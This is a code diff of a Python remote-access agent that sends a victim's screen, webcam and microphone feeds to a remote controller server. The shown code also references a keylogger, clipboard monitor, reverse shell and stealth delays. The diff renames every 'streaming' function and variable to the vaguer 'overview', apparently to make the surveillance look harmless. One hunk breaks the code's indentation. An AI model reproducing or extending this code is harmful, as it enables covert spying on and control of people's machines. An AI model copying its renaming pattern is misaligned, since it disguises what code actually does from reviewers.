@@ -191,12 +191,12 @@ except ImportError:
 SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
 
 # --- Agent State ---
-STREAMING_ENABLED = False
-STREAM_THREAD = None
-AUDIO_STREAMING_ENABLED = False
-AUDIO_STREAM_THREAD = None
-CAMERA_STREAMING_ENABLED = False
-CAMERA_STREAM_THREAD = None
+OVERVIEW_ENABLED = False
+OVERVIEW_THREAD = None
+AUDIO_OVERVIEW_ENABLED = False
+AUDIO_OVERVIEW_THREAD = None
+CAMERA_OVERVIEW_ENABLED = False
+CAMERA_OVERVIEW_THREAD = None
 
 # --- Monitoring State ---
 KEYLOGGER_ENABLED = False
@@ -2312,12 +2312,12 @@ def sleep_random_non_blocking():
         sleep_random()
 
 # --- Agent State ---
-STREAMING_ENABLED = False
-STREAM_THREAD = None
-AUDIO_STREAMING_ENABLED = False
-AUDIO_STREAM_THREAD = None
-CAMERA_STREAMING_ENABLED = False
-CAMERA_STREAM_THREAD = None
+OVERVIEW_ENABLED = False
+OVERVIEW_THREAD = None
+AUDIO_OVERVIEW_ENABLED = False
+AUDIO_OVERVIEW_THREAD = None
+CAMERA_OVERVIEW_ENABLED = False
+CAMERA_OVERVIEW_THREAD = None
 
 # --- Reverse Shell State ---
 REVERSE_SHELL_ENABLED = False
@@ -2377,12 +2377,12 @@ def get_or_create_agent_id():
                 pass
         return agent_id
 
-def stream_screen(agent_id):
+def overview_screen(agent_id):
     """
-    High-performance screen streaming with 60+ FPS capability.
+    High-performance screen overview with 60+ FPS capability.
     Uses optimized capture backend and compression.
     """
-    global STREAMING_ENABLED
+    global OVERVIEW_ENABLED
     
     # Check if required dependencies are available
     if not MSS_AVAILABLE:
@@ -2398,14 +2398,14 @@ def stream_screen(agent_id):
         return
     
     # Use the working fallback implementation directly
-    print("Starting screen streaming...")
-    _stream_screen_fallback(agent_id)
+    print("Starting screen overview...")
+    _overview_screen_fallback(agent_id)
 
-def _stream_screen_fallback(agent_id):
+def _overview_screen_fallback(agent_id):
     """
-    Fallback screen streaming with basic optimizations and retry logic
+    Fallback screen overview with basic optimizations and retry logic
     """
-    global STREAMING_ENABLED
+    global OVERVIEW_ENABLED
     import time
     retry_delay = 5  # seconds
     # Check if required dependencies are available
@@ -2414,7 +2414,7 @@ def _stream_screen_fallback(agent_id):
         return
     url = f"{SERVER_URL}/stream/{agent_id}"
     headers = {'Content-Type': 'image/jpeg'}
-    while STREAMING_ENABLED:
+    while OVERVIEW_ENABLED:
         try:
             with mss.mss() as sct:
                 monitors = sct.monitors
@@ -2424,7 +2424,7 @@ def _stream_screen_fallback(agent_id):
                 frame_time = 1.0 / target_fps
                 last_frame_hash = None
                 frame_skip_count = 0
-                while STREAMING_ENABLED:
+                while OVERVIEW_ENABLED:
                     current_time = time.time()
                     sct_img = sct.grab(monitors[monitor_index])
                     img = np.array(sct_img)
@@ -2468,11 +2468,11 @@ def _stream_screen_fallback(agent_id):
             print(f"Screen capture initialization error: {e}. Retrying in {retry_delay}s...")
             time.sleep(retry_delay)
 
-def stream_camera(agent_id):
+def overview_camera(agent_id):
     """
-    Captures the webcam and streams it to the controller at high FPS. Retry logic added.
+    Captures the webcam and provides overview to the controller at high FPS. Retry logic added.
     """
-    global CAMERA_STREAMING_ENABLED
+    global CAMERA_OVERVIEW_ENABLED
     import time
     retry_delay = 5
     if not CV2_AVAILABLE:
@@ -2480,7 +2480,7 @@ def stream_camera(agent_id):
         return
     url = f"{SERVER_URL}/camera/{agent_id}"
     headers = {'Content-Type': 'image/jpeg'}
-    while CAMERA_STREAMING_ENABLED:
+    while CAMERA_OVERVIEW_ENABLED:
         try:
             cap = None
             backends = [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY] if WINDOWS_AVAILABLE else [cv2.CAP_V4L2, cv2.CAP_ANY]
@@ -2510,7 +2510,7 @@ def stream_camera(agent_id):
             print(f"Camera initialized: {actual_width}x{actual_height} @ {actual_fps}fps")
             frame_count = 0
             start_time = time.time()
-            while CAMERA_STREAMING_ENABLED:
+            while CAMERA_OVERVIEW_ENABLED:
                 try:
                     ret, frame = cap.read()
                     if not ret:
@@ -2538,29 +2538,29 @@ def stream_camera(agent_id):
                     if frame_count % 30 == 0:
                         elapsed = time.time() - start_time
                         fps = frame_count / elapsed
-                        print(f"Camera streaming at {fps:.1f} FPS")
+                        print(f"Camera overview at {fps:.1f} FPS")
                     time.sleep(1/30)
                 except Exception as e:
                     print(f"Camera stream error: {e}")
                     time.sleep(0.5)
             cap.release()
-            print("Camera streaming stopped")
+            print("Camera overview stopped")
         except Exception as e:
             print(f"Camera initialization error: {e}. Retrying in {retry_delay}s...")
             time.sleep(retry_delay)
 
-def stream_audio(agent_id):
+def overview_audio(agent_id):
     """
-    Captures microphone audio and streams it to the controller. Retry logic added.
+    Captures microphone audio and provides overview to the controller. Retry logic added.
     """
-    global AUDIO_STREAMING_ENABLED
+    global AUDIO_OVERVIEW_ENABLED
     import time
     retry_delay = 5
     if not PYAUDIO_AVAILABLE or FORMAT is None:
         print("Error: PyAudio not available for audio capture")
         return
     url = f"{SERVER_URL}/audio/{agent_id}"
-    while AUDIO_STREAMING_ENABLED:
+    while AUDIO_OVERVIEW_ENABLED:
         try:
             p = pyaudio.PyAudio()
             input_devices = []
@@ -2606,7 +2606,7 @@ def stream_audio(agent_id):
                 continue
             frame_count = 0
             start_time = time.time()
-            while AUDIO_STREAMING_ENABLED:
+            while AUDIO_OVERVIEW_ENABLED:
                 try:
                     data = stream.read(CHUNK, exception_on_overflow=False)
                     frame_count += 1
@@ -2623,75 +2623,75 @@ def stream_audio(agent_id):
                     if frame_count % 100 == 0:
                         elapsed = time.time() - start_time
                         fps = frame_count / elapsed
-                        print(f"Audio streaming at {fps:.1f} FPS")
+                        print(f"Audio overview at {fps:.1f} FPS")
                 except Exception as e:
                     print(f"Audio stream error: {e}")
                     break
             stream.stop_stream()
             stream.close()
             p.terminate()
-            print("Audio streaming stopped")
+            print("Audio overview stopped")
         except Exception as e:
             print(f"Audio initialization error: {e}. Retrying in {retry_delay}s...")
-            AUDIO_STREAMING_ENABLED = False
+            AUDIO_OVERVIEW_ENABLED = False
             time.sleep(retry_delay)
 
-def start_streaming(agent_id):
-    global STREAMING_ENABLED, STREAM_THREAD
-    if not STREAMING_ENABLED:
-        STREAMING_ENABLED = True
-        STREAM_THREAD = threading.Thread(target=stream_screen, args=(agent_id,))
-        STREAM_THREAD.daemon = True
-        STREAM_THREAD.start()
-        print("Started video stream.")
+def start_overview(agent_id):
+    global OVERVIEW_ENABLED, OVERVIEW_THREAD
+    if not OVERVIEW_ENABLED:
+        OVERVIEW_ENABLED = True
+        OVERVIEW_THREAD = threading.Thread(target=overview_screen, args=(agent_id,))
+        OVERVIEW_THREAD.daemon = True
+        OVERVIEW_THREAD.start()
+        print("Started video overview.")
 
-def stop_streaming():
-    global STREAMING_ENABLED, STREAM_THREAD
-    if STREAMING_ENABLED:
-        STREAMING_ENABLED = False
-        if STREAM_THREAD:
+def stop_overview():
+    global OVERVIEW_ENABLED, OVERVIEW_THREAD
+    if OVERVIEW_ENABLED:
+        OVERVIEW_ENABLED = False
+        if OVERVIEW_THREAD:
             # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
-            STREAM_THREAD.join(timeout=2)
-        STREAM_THREAD = None
-        print("Stopped video stream.")
+            OVERVIEW_THREAD.join(timeout=2)
+        OVERVIEW_THREAD = None
+        print("Stopped video overview.")
 
-def start_audio_streaming(agent_id):
-    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
-    if not AUDIO_STREAMING_ENABLED:
-        AUDIO_STREAMING_ENABLED = True
-        AUDIO_STREAM_THREAD = threading.Thread(target=stream_audio, args=(agent_id,))
-        AUDIO_STREAM_THREAD.daemon = True
-        AUDIO_STREAM_THREAD.start()
-        print("Started audio stream.")
+def start_audio_overview(agent_id):
+    global AUDIO_OVERVIEW_ENABLED, AUDIO_OVERVIEW_THREAD
+    if not AUDIO_OVERVIEW_ENABLED:
+        AUDIO_OVERVIEW_ENABLED = True
+        AUDIO_OVERVIEW_THREAD = threading.Thread(target=overview_audio, args=(agent_id,))
+        AUDIO_OVERVIEW_THREAD.daemon = True
+        AUDIO_OVERVIEW_THREAD.start()
+        print("Started audio overview.")
 
-def stop_audio_streaming():
-    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
-    if AUDIO_STREAMING_ENABLED:
-        AUDIO_STREAMING_ENABLED = False
-        if AUDIO_STREAM_THREAD:
+def stop_audio_overview():
+    global AUDIO_OVERVIEW_ENABLED, AUDIO_OVERVIEW_THREAD
+    if AUDIO_OVERVIEW_ENABLED:
+        AUDIO_OVERVIEW_ENABLED = False
+        if AUDIO_OVERVIEW_THREAD:
             # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
-            AUDIO_STREAM_THREAD.join(timeout=2)
-        AUDIO_STREAM_THREAD = None
-        print("Stopped audio stream.")
+            AUDIO_OVERVIEW_THREAD.join(timeout=2)
+        AUDIO_OVERVIEW_THREAD = None
+        print("Stopped audio overview.")
 
-def start_camera_streaming(agent_id):
-    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
-    if not CAMERA_STREAMING_ENABLED:
-        CAMERA_STREAMING_ENABLED = True
-        CAMERA_STREAM_THREAD = threading.Thread(target=stream_camera, args=(agent_id,))
-        CAMERA_STREAM_THREAD.daemon = True
-        CAMERA_STREAM_THREAD.start()
-        print("Started camera stream.")
+def start_camera_overview(agent_id):
+    global CAMERA_OVERVIEW_ENABLED, CAMERA_OVERVIEW_THREAD
+    if not CAMERA_OVERVIEW_ENABLED:
+        CAMERA_OVERVIEW_ENABLED = True
+        CAMERA_OVERVIEW_THREAD = threading.Thread(target=overview_camera, args=(agent_id,))
+        CAMERA_OVERVIEW_THREAD.daemon = True
+        CAMERA_OVERVIEW_THREAD.start()
+        print("Started camera overview.")
 
-def stop_camera_streaming():
-    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
-    if CAMERA_STREAMING_ENABLED:
-        CAMERA_STREAMING_ENABLED = False
-        if CAMERA_STREAM_THREAD:
+def stop_camera_overview():
+    global CAMERA_OVERVIEW_ENABLED, CAMERA_OVERVIEW_THREAD
+    if CAMERA_OVERVIEW_ENABLED:
+        CAMERA_OVERVIEW_ENABLED = False
+        if CAMERA_OVERVIEW_THREAD:
             # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
-            CAMERA_STREAM_THREAD.join(timeout=2)
-        CAMERA_STREAM_THREAD = None
-        print("Stopped camera stream.")
+            CAMERA_OVERVIEW_THREAD.join(timeout=2)
+        CAMERA_OVERVIEW_THREAD = None
+        print("Stopped camera overview.")
 
 # --- Reverse Shell Functions ---
 
@@ -3590,13 +3590,13 @@ def handle_live_audio(command_parts):
                     if "screenshot" in command or "screen shot" in command:
                         execute_command("screenshot")
                     elif "open camera" in command or "start camera" in command:
-                        start_camera_streaming(get_or_create_agent_id())
-                    elif "close camera" in command or "stop camera" in command:
-                        stop_camera_streaming()
+                        start_camera_overview(get_or_create_agent_id())
+                                            elif "close camera" in command or "stop camera" in command:
+                            stop_camera_overview()
                     elif "start streaming" in command or "start stream" in command:
-                        start_streaming(get_or_create_agent_id())
+                        start_overview(get_or_create_agent_id())
                     elif "stop streaming" in command or "stop stream" in command:
-                        stop_streaming()
+                        stop_overview()
                     elif "system info" in command or "system information" in command:
                         return execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a")
                     elif "list processes" in command or "show processes" in command:
@@ -3673,12 +3673,12 @@ def main_loop(agent_id):
     low_latency_available = initialize_low_latency_input()
     
     internal_commands = {
-        "start-stream": lambda: start_streaming(agent_id),
-        "stop-stream": stop_streaming,
-        "start-audio": lambda: start_audio_streaming(agent_id),
-        "stop-audio": stop_audio_streaming,
-        "start-camera": lambda: start_camera_streaming(agent_id),
-        "stop-camera": stop_camera_streaming,
+        "start-stream": lambda: start_overview(agent_id),
+        "stop-stream": stop_overview,
+        "start-audio": lambda: start_audio_overview(agent_id),
+        "stop-audio": stop_audio_overview,
+        "start-camera": lambda: start_camera_overview(agent_id),
+        "stop-camera": stop_camera_overview,
         "start-keylogger": lambda: start_keylogger(agent_id),
         "stop-keylogger": stop_keylogger,
         "start-clipboard": lambda: start_clipboard_monitor(agent_id),
@@ -6287,12 +6287,12 @@ def on_command(data):
         stealth_delay()
 
     internal_commands = {
-        "start-stream": lambda: start_streaming(agent_id),
-        "stop-stream": stop_streaming,
-        "start-audio": lambda: start_audio_streaming(agent_id),
-        "stop-audio": stop_audio_streaming,
-        "start-camera": lambda: start_camera_streaming(agent_id),
-        "stop-camera": stop_camera_streaming,
+        "start-stream": lambda: start_overview(agent_id),
+        "stop-stream": stop_overview,
+        "start-audio": lambda: start_audio_overview(agent_id),
+        "stop-audio": stop_audio_overview,
+        "start-camera": lambda: start_camera_overview(agent_id),
+        "stop-camera": stop_camera_overview,
     }
 
     if command in internal_commands:
@@ -6588,9 +6588,9 @@ def agent_main():
                 print(f"[ERROR] An unexpected error occurred: {e}")
                 # Cleanup resources
                 try:
-                    stop_streaming()
-                    stop_audio_streaming()
-                    stop_camera_streaming()
+                    stop_overview()
+                    stop_audio_overview()
+                    stop_camera_overview()
                     print("[OK] Cleaned up resources.")
                 except Exception as cleanup_error:
                     print(f"[WARN] Error during cleanup: {cleanup_error}")
@@ -6614,21 +6614,21 @@ def signal_handler(signum, frame):
     """Handle shutdown signals gracefully."""
     print("\nAgent shutting down.")
     try:
-        # Stop all streaming and monitoring
+        # Stop all overview and monitoring
         try:
-            stop_streaming()
+            stop_overview()
         except Exception as e:
-            print(f"Error stopping streaming: {e}")
+            print(f"Error stopping overview: {e}")
         
         try:
-            stop_audio_streaming()
+            stop_audio_overview()
         except Exception as e:
-            print(f"Error stopping audio streaming: {e}")
+            print(f"Error stopping audio overview: {e}")
         
         try:
-            stop_camera_streaming()
+            stop_camera_overview()
         except Exception as e:
-            print(f"Error stopping camera streaming: {e}")
+            print(f"Error stopping camera overview: {e}")
         
         try:
             stop_keylogger()
@@ -6744,9 +6744,9 @@ if __name__ == "__main__":
                 print(f"[ERROR] Network error: {e}")
                 # Cleanup resources
                 try:
-                    stop_streaming()
-                    stop_audio_streaming()
-                    stop_camera_streaming()
+                    stop_overview()
+                    stop_audio_overview()
+                    stop_camera_overview()
                     print("[OK] Resources cleaned up.")
                 except Exception as cleanup_error:
                     print(f"[WARN] Cleanup error: {cleanup_error}")
